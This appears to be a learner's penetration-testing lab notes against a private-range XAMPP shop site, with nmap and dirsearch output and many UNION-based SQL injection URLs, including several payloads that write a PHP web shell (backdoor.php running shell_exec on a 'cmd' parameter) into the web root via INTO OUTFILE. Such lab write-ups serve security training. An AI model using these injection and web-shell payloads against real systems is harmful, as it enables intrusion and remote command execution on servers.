```shell
# tcp scan
nmap -vv --open ~ shows open and closed
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 192.168.119.112    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 17:53 EST
Nmap scan report for 192.168.119.112
Host is up (0.051s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
81/tcp   open  http       Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Shoppr
443/tcp  open  ssl/http   Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/7.3.29)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.3.29
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.119.112/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.49.119' is not allowed to connect to this MariaDB server
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=3/10%Time=640BB57D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.119'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.83 seconds


```

![[1.cgi-bin.png]]

```shell

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u http://192.168.119.112:81 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.119.112-81/_23-03-10_18-03-25.txt

Error Log: /root/.dirsearch/logs/errors-23-03-10_18-03-25.log

Target: http://192.168.119.112:81/

[18:03:26] Starting: 
[18:06:02] 200 -    9KB - /about
[18:06:14] 302 -  140B  - /accessibility
[18:06:15] 302 -    0B  - /account  ->  /
[18:06:23] 302 -    0B  - /address  ->  /
[18:08:13] 301 -  347B  - /assets  ->  http://192.168.119.112:81/assets/
[18:08:38] 200 -    9KB - /cart
[18:08:41] 200 -    2KB - /cgi-bin/printenv.pl
[18:08:43] 302 -    0B  - /checkout  ->  /
[18:10:00] 503 -  405B  - /examples/servlet/SnoopServlet
[18:10:00] 503 -  405B  - /examples/jsp/snp/snoop.jsp
[18:10:00] 503 -  405B  - /examples/
[18:10:01] 503 -  405B  - /examples
[18:10:01] 503 -  405B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[18:10:01] 503 -  405B  - /examples/servlets/servlet/RequestHeaderExample
[18:10:01] 503 -  405B  - /examples/servlets/index.html
[18:10:01] 503 -  405B  - /examples/servlets/servlet/CookieExample
[18:10:42] 200 -   17KB - /index.php
[18:10:43] 200 -   17KB - /index.pHp
[18:10:43] 200 -   17KB - /index.php.
[18:11:09] 200 -   11KB - /login
[18:11:13] 302 -    0B  - /logout  ->  /
[18:12:10] 302 -    0B  - /payments  ->  /
[18:12:39] 302 -    0B  - /product  ->  /
[18:12:48] 200 -   11KB - /register
[18:13:20] 200 -   23KB - /shop
[18:13:41] 405 -    6KB - /subscribe
```


```shell
#somekind of sql injection is going on on the product page


http://192./debug.php?id=1 union all select 1, 2, "<?php echo
shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'

http://192.168.119.112:81/product?id=1' union select @@version,2,3,4,
http://192.168.119.112:81/product?id=1%20union%20all%20select%201,%202,%203,
http://192.168.119.112:81/product?id=1%20union%20all%20select%201,%202,%203,

http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, @@version

http://192.168.119.112:81/product?id=1 union all select 1, 2, 3, 4, 5, 6, 7, 8, @@version-- - 

http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5, 6, 7, @@version-- -, @@version-- - 

http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5, 6, 7, 8
http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5, 6, 7
http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5, 6
http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4, 5
http://192.168.119.112:81/product?id=105 union all select 1, 2, 3, 4
http://192.168.119.112:81/product?id=105 union all select 1, 2, 3
http://192.168.119.112:81/product?id=105 union all select 1, 2
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5


Fashion! Turn to the left. Invalid Login Error in C:\xampp\htdocs\site2\public\index.php line 3

http://192.168.119.112:81/product?id=1 union all select 1, 2, "<?php echo
shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/site2/src/app/Product/Product.php/backdoor.php'


http://192.168.119.112:81/product?id=105%20union%20all%20select%201,%202,%203,


tried this. 
http://192.168.119.112:81/product?id=97%27%20union%20all%20select%201,%202,%203,%204,%205,%206,%207,%208,%209,%2010,%2011,%2012%20@@version



Fashion! Turn to the left. You need to be authenticated to see that! Error in C:\xampp\htdocs\site2\public\index.php line 3
```

```shell
#still trying sql injecttion
# image 2 shows a lotation of root that could be used to inject a webshell

http://192.168.119.112:81/product?id=1' union all select 1,
http://192.168.119.112:81/product?id=1' union all select 1, 2,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
http://192.168.119.112:81/product?id=1' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,


http://192.168.119.112:81/product?id=96' union all select 1,
http://192.168.119.112:81/product?id=96' union all select 1, 2,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
http://192.168.119.112:81/product?id=96' union all select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,





```

![[2. location to place file.png]]


```shell
#moving on from sql

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u https://192.168.119.112:443 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.119.112-443/_23-03-10_22-24-21.txt

Error Log: /root/.dirsearch/logs/errors-23-03-10_22-24-21.log

Target: https://192.168.119.112:443/

[22:24:21] Starting: 
[22:24:30] 200 -  783B  - /Webalizer/
[22:24:41] 200 -    2KB - /cgi-bin/printenv.pl
[22:24:43] 301 -  349B  - /dashboard  ->  https://192.168.119.112/dashboard/
[22:24:44] 200 -    6KB - /dashboard/howto.html
[22:24:44] 200 -   31KB - /dashboard/faq.html
[22:24:45] 200 -   93KB - /dashboard/phpinfo.php
[22:24:47] 200 -   30KB - /favicon.ico
[22:24:49] 503 -  406B  - /examples/servlet/SnoopServlet
[22:24:49] 503 -  406B  - /examples/servlets/index.html
[22:24:49] 503 -  406B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[22:24:49] 503 -  406B  - /examples/jsp/snp/snoop.jsp
[22:24:49] 503 -  406B  - /examples/
[22:24:49] 503 -  406B  - /examples
[22:24:49] 503 -  406B  - /examples/servlets/servlet/RequestHeaderExample
[22:24:49] 503 -  406B  - /examples/servlets/servlet/CookieExample
[22:24:49] 301 -  343B  - /img  ->  https://192.168.119.112/img/
[22:24:49] 302 -    0B  - /index.php  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.pHp  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.php.  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.php/login/  ->  https://192.168.119.112/dashboard/
[22:25:10] 200 -  775B  - /xampp/


┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u https://192.168.119.112:443 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.119.112-443/_23-03-10_22-24-21.txt

Error Log: /root/.dirsearch/logs/errors-23-03-10_22-24-21.log

Target: https://192.168.119.112:443/

[22:24:21] Starting: 
[22:24:30] 200 -  783B  - /Webalizer/
[22:24:41] 200 -    2KB - /cgi-bin/printenv.pl
[22:24:43] 301 -  349B  - /dashboard  ->  https://192.168.119.112/dashboard/
[22:24:44] 200 -    6KB - /dashboard/howto.html
[22:24:44] 200 -   31KB - /dashboard/faq.html
[22:24:45] 200 -   93KB - /dashboard/phpinfo.php
[22:24:47] 200 -   30KB - /favicon.ico
[22:24:49] 503 -  406B  - /examples/servlet/SnoopServlet
[22:24:49] 503 -  406B  - /examples/servlets/index.html
[22:24:49] 503 -  406B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[22:24:49] 503 -  406B  - /examples/jsp/snp/snoop.jsp
[22:24:49] 503 -  406B  - /examples/
[22:24:49] 503 -  406B  - /examples
[22:24:49] 503 -  406B  - /examples/servlets/servlet/RequestHeaderExample
[22:24:49] 503 -  406B  - /examples/servlets/servlet/CookieExample
[22:24:49] 301 -  343B  - /img  ->  https://192.168.119.112/img/
[22:24:49] 302 -    0B  - /index.php  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.pHp  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.php.  ->  https://192.168.119.112/dashboard/
[22:24:50] 302 -    0B  - /index.php/login/  ->  https://192.168.119.112/dashboard/
[22:25:10] 200 -  775B  - /xampp/

Task Completed
                                                                                
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# dirsearch -u https://192.168.119.112:443/webalizer/ -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.119.112-443/-webalizer-_23-03-10_22-26-21.txt

Error Log: /root/.dirsearch/logs/errors-23-03-10_22-26-21.log

Target: https://192.168.119.112:443/webalizer/

[22:26:21] Starting: 
[22:26:23] 404 -  303B  - /webalizer/%2e%2e//google.com
[22:26:31] 404 -  303B  - /webalizer/\..\..\..\..\..\..\..\..\..\etc\passwd
[22:26:32] 404 -  303B  - /webalizer/a%5c.aspx

```

![[3. made account.png]]


```shell
# may have found the sql injection
```

![[6. sql attempt.png]]


Take another look at the gee wilikers error when utilizing the single quote, once the gee wilikers is triggered try to do the id=1 union all select, increment by 1 until there’s a new error or no error at all, when there’s no more errors can play with @@version to find the place to inject a reverse shell

```shell
#dirsearch found /dashboard/images which has content
```
![[5. dirsearch.png]]


![[4. 443 name of team.png]]

![[7. failed sql.png]]

![[8. sql'able.png]]

```shell
# sql injection i believe this is the one actually. 

```

![[9 sql actual p1.png]]

![[9.2 sql actual error p2.png]]

![[10. sql union p1.png]]

![[10.2 sql union p2.png]]

![[11. sql no single quote p1.png]]
![[11. sql no single quote p2.png]]

![[12. sql injection working.png]]

```shell
#note when the page is entered it doesnt break it stays
```

![[13. @@version doesnt break.png]]

![[14. sql shell attempt 1 p1.png]]

![[14.2 sql shell attempt p1.png]]

![[15. sql union all select 6.png]]

![[15.2 union all select 6 error.png]]



```shell
# post test notes

# in image 13 need to move @@version around to see where it is vulnerable and spitting out into the screen
# doesn't really matter, the @@version just spits the maria page out to the screen but since we already knew it was vulnerable it doesnt matter.

1, 2, 3, @@version, 5
1, 2, @@version, 4, 5
@@version, 2, 3, 4, 5

#like pmans write up it possible could have worked if i split the GET['cmd'] in column 8 for example then the outfile into column 9
# the character set portion is not in the pdf but is referenced @ medium.com for writeups.
#below example

http://192.168.111.112/product?id=1 union all select 1, 2, 3, 4, 5, 6, 7, "<?php echo  
shell_exec($_GET['cmd']);?>", 9 into OUTFILE 'c:/xampp/htdocs/site1/public/backdoor3.php'  CHARACTER SET utf8;
```

![[13. @@version doesnt break.png]]


```shell
#image 9.2 displays the path that the backdoor should be placed into
```